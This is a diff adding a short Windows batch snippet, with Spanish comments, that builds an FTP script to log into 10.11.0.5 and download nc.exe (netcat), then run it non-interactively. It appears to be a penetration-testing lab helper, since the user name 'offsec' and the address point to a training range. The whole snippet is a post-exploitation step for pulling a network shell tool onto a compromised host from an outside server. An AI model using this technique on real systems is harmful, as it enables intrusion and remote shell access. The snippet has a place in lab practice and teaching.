@@ -1,0 +1,11 @@
+::## Cambiar: IP, UserName, Passw0rd, "nc.exe"
+
+echo open 10.11.0.5 21 > ftp.txt
+echo UserName offsec >> ftp.txt
+echo Passw0rd >> ftp.txt
+echo binary >> ftp.txt
+echo GET nc.exe >> ftp.txt
+echo bye >> ftp.txt
+
+::## Usar:
+::## cmd> ftp -v -n -s:ftp.txt
